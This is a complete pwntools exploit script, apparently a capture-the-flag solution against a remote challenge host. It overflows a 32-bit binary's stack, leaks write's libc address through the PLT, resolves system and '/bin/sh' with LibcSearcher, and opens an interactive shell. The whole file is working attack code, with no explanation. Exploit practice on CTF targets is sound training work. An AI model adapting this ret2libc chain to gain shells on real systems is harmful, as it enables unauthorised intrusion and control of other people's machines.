from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28153)
elf = ELF('pwn')
main = elf.sym['main']
write_got = elf.got['write']
write_plt = elf.plt['write']
payload = cyclic(0x6b+4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4)
io.recvuntil('O.o?')
io.sendline(payload)
write = u32(io.recvuntil('\xf7')[-4:])
print(hex(write))
libc = LibcSearcher('write',write)
libc_base = write - libc.dump('write')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x6b+4) + p32(system) + p32(main) + p32(bin_sh)
io.sendline(payload)
io.recv()
io.interactive()